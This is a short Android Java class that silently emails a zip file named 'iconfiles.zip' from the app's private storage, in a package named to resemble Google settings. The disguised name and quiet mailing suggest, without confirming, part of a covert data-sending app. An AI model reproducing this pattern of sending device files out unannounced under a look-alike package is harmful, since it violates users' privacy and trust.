package com.setting.dl.google.googlesettings.mail;

import android.content.Context;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;

import java.io.File;


class MailSendIcons{
    
    
    private String value;
    final private Context context;
    
    MailSendIcons(Context context, String v) {
        
        this.context = context;
        value = v;
        run();
    }
    
    
    private void run() {
    
    
        File zipFile = new File(context.getFilesDir(), "iconfiles.zip");
        
        if(!zipFile.exists()) return;
    
        Mail.send(context, "icons", value, zipFile);
        //Orders.deleteSendMails(context);
    }
}
